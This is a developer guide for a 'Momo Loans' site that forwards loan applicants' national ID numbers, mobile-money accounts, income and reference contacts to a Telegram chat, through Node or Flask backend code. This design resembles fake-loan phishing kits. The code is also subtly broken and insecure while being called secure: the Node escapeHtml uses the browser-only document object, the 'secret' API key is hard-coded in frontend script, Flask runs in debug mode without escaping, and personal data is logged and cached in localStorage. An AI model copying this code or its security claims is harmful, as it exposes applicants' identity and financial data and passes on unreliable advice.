# Backend Integration Guide for Momo Loans

This guide shows you how to securely integrate your Telegram bot with a backend API instead of using direct client-side calls.

## Why Backend Integration?

🔐 **Security Benefits:**
- Bot token is never exposed in browser
- Credentials stored safely on server
- Can validate and sanitize data
- Can rate-limit submissions
- Can add CAPTCHA verification
- Can log all submissions securely

---

## Architecture

```
┌─────────────────┐
│   User Browser  │
│   (React/Vue)   │
└────────┬────────┘
         │ POST /api/submit-loan
         │ (Form data only)
         ↓
┌─────────────────────────────┐
│   Your Backend Server       │
│  (Node.js/Python/Go)        │
└────────┬────────────────────┘
         │ Uses secured bot token
         │ from environment variable
         ↓
┌─────────────────────────────┐
│   Telegram Bot API          │
│   api.telegram.org/bot...   │
└─────────────────────────────┘
```

---

## Option 1: Node.js/Express Backend

### 1. Create Backend Server

**File: `backend/server.js`**

```javascript
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Rate limiting: Max 10 requests per hour per IP
const limiter = rateLimit({
    windowMs: 60 * 60 * 1000, // 1 hour
    max: 10,
    message: 'Too many loan applications from this IP'
});

// API key validation middleware
const validateApiKey = (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey !== process.env.API_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    next();
};

// Submit loan application endpoint
app.post('/api/submit-loan', limiter, validateApiKey, async (req, res) => {
    try {
        const formData = req.body;

        // Validate form data
        if (!formData.personalInfo || !formData.loanDetails) {
            return res.status(400).json({ error: 'Invalid form data' });
        }

        // Format message for Telegram
        const message = formatTelegramMessage(formData);

        // Send to Telegram
        const response = await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            }
        );

        // Log submission (optional)
        console.log('Loan application submitted:', {
            timestamp: new Date().toISOString(),
            applicantName: formData.personalInfo.fullName,
            loanAmount: formData.loanDetails.amount,
            telegramMessageId: response.data.result.message_id
        });

        // Return success
        res.json({
            success: true,
            message: 'Application submitted successfully',
            submissionId: response.data.result.message_id
        });

    } catch (error) {
        console.error('Error submitting application:', error);
        res.status(500).json({
            error: 'Failed to submit application',
            details: error.message
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date() });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Momo Loans backend running on port ${PORT}`);
});

// Format message for Telegram
function formatTelegramMessage(data) {
    const info = data.personalInfo;
    const loan = data.loanDetails;
    const financial = data.financialInfo;
    const ref = data.reference;

    return `
🎉 <b>NEW LOAN APPLICATION</b>

<b>👤 Personal Information:</b>
Name: ${escapeHtml(info.fullName)}
Email: ${escapeHtml(info.email)}
Phone: ${escapeHtml(info.phone)}
National ID: ${escapeHtml(info.nationalID)}
DOB: ${info.dateOfBirth}

<b>💰 Loan Details:</b>
Type: ${loan.type.toUpperCase()}
Amount: USH ${formatNumber(loan.amount)}
Purpose: ${loan.purpose}
Repayment Period: ${loan.repaymentPeriod} months

<b>💵 Financial Information:</b>
Monthly Income: USH ${formatNumber(financial.monthlyIncome)}
Momo Account: ${escapeHtml(financial.momoAccount)}
Employment: ${financial.employmentStatus}

<b>👥 Reference:</b>
Name: ${escapeHtml(ref.contactName)}
Phone: ${escapeHtml(ref.contactPhone)}

<b>⏰ Submitted:</b> ${new Date(data.submissionTime).toLocaleString()}
    `.trim();
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}
```

### 2. Create `.env` File

**File: `backend/.env`**

```
PORT=3000
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqRSTuvWXYZabcdefGH
TELEGRAM_CHAT_ID=987654321
API_KEY=your_secret_api_key_here
```

### 3. Install Dependencies

```bash
cd backend
npm install express cors axios dotenv express-rate-limit
```

### 4. Update Frontend Code

Instead of calling Telegram directly, call your backend:

**Update `assets/js/script.js`:**

```javascript
function submitApplicationData(formData) {
    // Call your secure backend instead of Telegram
    fetch('/api/submit-loan', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-API-Key': 'your_secret_api_key_here'
        },
        body: JSON.stringify(formData)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Application submitted successfully');
            showSuccessMessage();
        } else {
            throw new Error(data.error || 'Submission failed');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Failed to submit application. Please try again.');
    });

    // Save locally as backup
    localStorage.setItem('momo_application_' + Date.now(), JSON.stringify(formData));
}
```

### 5. Run Backend

```bash
cd backend
node server.js
# Server running on http://localhost:3000
```

---

## Option 2: Python/Flask Backend

### 1. Create Flask Server

**File: `backend/app.py`**

```python
from flask import Flask, request, jsonify
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import requests
import os
from dotenv import load_dotenv
from functools import wraps

load_dotenv()

app = Flask(__name__)
CORS(app)

# Rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["10 per hour"]
)

# API key validation
def validate_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if api_key != os.getenv('API_KEY'):
            return {'error': 'Unauthorized'}, 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/api/submit-loan', methods=['POST'])
@limiter.limit("10 per hour")
@validate_api_key
def submit_loan():
    try:
        form_data = request.get_json()

        # Validate form data
        if not form_data or 'personalInfo' not in form_data:
            return {'error': 'Invalid form data'}, 400

        # Format message
        message = format_telegram_message(form_data)

        # Send to Telegram
        response = requests.post(
            f"https://api.telegram.org/bot{os.getenv('TELEGRAM_BOT_TOKEN')}/sendMessage",
            json={
                'chat_id': os.getenv('TELEGRAM_CHAT_ID'),
                'text': message,
                'parse_mode': 'HTML'
            }
        )

        if response.status_code == 200:
            return {
                'success': True,
                'message': 'Application submitted successfully',
                'submissionId': response.json()['result']['message_id']
            }
        else:
            return {'error': 'Failed to send message'}, 500

    except Exception as error:
        print(f'Error: {str(error)}')
        return {'error': 'Failed to submit application'}, 500

@app.route('/health', methods=['GET'])
def health():
    return {'status': 'OK'}

def format_telegram_message(data):
    info = data['personalInfo']
    loan = data['loanDetails']
    financial = data['financialInfo']
    ref = data['reference']

    return f"""🎉 <b>NEW LOAN APPLICATION</b>

<b>👤 Personal Information:</b>
Name: {info['fullName']}
Email: {info['email']}
Phone: {info['phone']}
National ID: {info['nationalID']}
DOB: {info['dateOfBirth']}

<b>💰 Loan Details:</b>
Type: {loan['type'].upper()}
Amount: USH {format_number(loan['amount'])}
Purpose: {loan['purpose']}
Repayment Period: {loan['repaymentPeriod']} months

<b>💵 Financial Information:</b>
Monthly Income: USH {format_number(financial['monthlyIncome'])}
Momo Account: {financial['momoAccount']}
Employment: {financial['employmentStatus']}

<b>👥 Reference:</b>
Name: {ref['contactName']}
Phone: {ref['contactPhone']}

<b>⏰ Submitted:</b> {data['submissionTime']}"""

def format_number(num):
    return "{:,}".format(int(num))

if __name__ == '__main__':
    app.run(debug=True, port=3000)
```

### 2. Create `requirements.txt`

**File: `backend/requirements.txt`**

```
Flask==2.3.0
Flask-CORS==4.0.0
Flask-Limiter==3.5.0
requests==2.31.0
python-dotenv==1.0.0
```

### 3. Install & Run

```bash
cd backend
pip install -r requirements.txt
python app.py
```

---

## Option 3: Deploy on Heroku

### 1. Create Procfile

**File: `Procfile`**

```
web: gunicorn app:app
```

### 2. Create `runtime.txt`

**File: `runtime.txt`**

```
python-3.11.0
```

### 3. Deploy

```bash
heroku login
heroku create momo-loans-backend
heroku config:set TELEGRAM_BOT_TOKEN=your_token
heroku config:set TELEGRAM_CHAT_ID=your_chat_id
heroku config:set API_KEY=your_secret_key
git push heroku main
```

---

## Update Frontend for Backend URL

Change the fetch URL to your backend:

**Development:**
```javascript
const backendUrl = 'http://localhost:3000/api/submit-loan';
```

**Production:**
```javascript
const backendUrl = 'https://momo-loans-backend.herokuapp.com/api/submit-loan';
```

---

## Security Checklist

✅ Never commit `.env` file  
✅ Store secrets in environment variables  
✅ Validate all form data on backend  
✅ Use HTTPS in production  
✅ Implement rate limiting  
✅ Add API key authentication  
✅ Log all submissions  
✅ Use CORS properly  
✅ Sanitize user input  
✅ Keep dependencies updated  

---

## Monitoring & Logging

Add logging for production:

```javascript
// Log to monitoring service
fetch('https://logs.example.com/api/logs', {
    method: 'POST',
    body: JSON.stringify({
        event: 'loan_submission',
        timestamp: new Date(),
        amount: formData.loanDetails.amount,
        status: 'submitted'
    })
});
```

---

## Next Steps

1. Choose Node.js or Python
2. Create backend server
3. Set up environment variables
4. Test locally
5. Deploy to production
6. Update frontend URL
7. Monitor submissions

Your Momo Loans backend is now secure! 🔒
